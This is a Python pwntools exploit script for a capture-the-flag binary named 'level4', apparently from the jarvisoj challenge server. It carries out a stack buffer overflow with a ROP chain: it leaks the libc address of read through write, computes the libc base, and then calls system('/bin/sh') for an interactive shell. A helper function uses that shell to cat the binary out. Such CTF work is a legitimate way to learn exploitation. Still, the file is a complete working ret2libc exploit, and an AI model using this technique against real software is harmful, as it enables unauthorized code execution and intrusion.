#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import os, sys

DEBUG = 1
context.arch = "amd64"
#context.log_level = "debug"
elf = ELF("./level4",checksec=False)

# synonyms for faster typing
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.ra = tube.recvall
tube.rr = tube.recvregex
tube.irt = tube.interactive

if DEBUG == 1:
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	s = process("./level4")
elif DEBUG == 2:
	libc = ELF("./libc.so.6",checksec=False)
	s = process("./level4", env={"LD_PRELOAD":"./libc.so.6"})
elif DEBUG == 3:
	libc = ELF("./libc6-amd64_2.13-20ubuntu5.2_i386.so",checksec=False)
	ip = "pwn.jarvisoj.com" 
	port = 9876
	s = remote(ip,port)

def z(addr):
    raw_input("debug?")
    gdb.attach(s, "b *" + str(addr))

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open("/proc/%s/mem" % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink("/proc/%s/exe" % pid)
   with open("/proc/%s/maps" % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split("-")[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def zx(addr = 0):
    global mypid
    mypid = proc.pidof(s)[0]
    raw_input("debug?")
    with open("/proc/%s/mem" % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        gdb.attach(s, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

def pwn():
   z(0x40050A)

   rdi = 0x4006f3
   rsi = 0x4006f1

   s.ru("message:\n")

   payload = "A" * 136
   payload += p64(rdi) #p64(0x400620)
   payload += p64(1)
   payload += p64(rsi)
   payload += p64(elf.got["read"])
   payload += p64(0)
   payload += p64(elf.plt["write"])
   payload += p64(0x4004E0)

   s.s(payload)

   s.rl()

   libc_base = u64(s.r(6) + "\0\0") - libc.sym["read"]
   info("libc_base 0x%x", libc_base)
   # 0x7f5fc0cc7700 write
   # 0x7f6665f3ae50 __libc_start_main
   # 0x7f13a96506a0 read
   one_gadget = libc_base + 0x41ffd
   info("one_gadget 0x%x", one_gadget)

   '''
   0x41f9a	execve("/bin/sh", rsp+0x140, environ)
   constraints:
   rax == NULL

   0x41ffd	execve("/bin/sh", rsp+0x140, environ)
   constraints:
   [rsp+0x140] == NULL
   '''

   s.ru("message:\n")

   payload2 = "A" * 136
   payload2 += p64(rdi)
   payload2 += p64(libc_base + libc.search("/bin/sh").next())
   payload2 += p64(libc_base + libc.sym["system"])

   s.s(payload2)
   
   s.irt()

def dump():
	pwn()
	s.recv(timeout=1)
	s.sl("cat level4")
	s.sl("exit")
	data = s.ra()
	f = open("dump", "wb")
	f.write(data)
	f.close()

if __name__ == "__main__":
    pwn()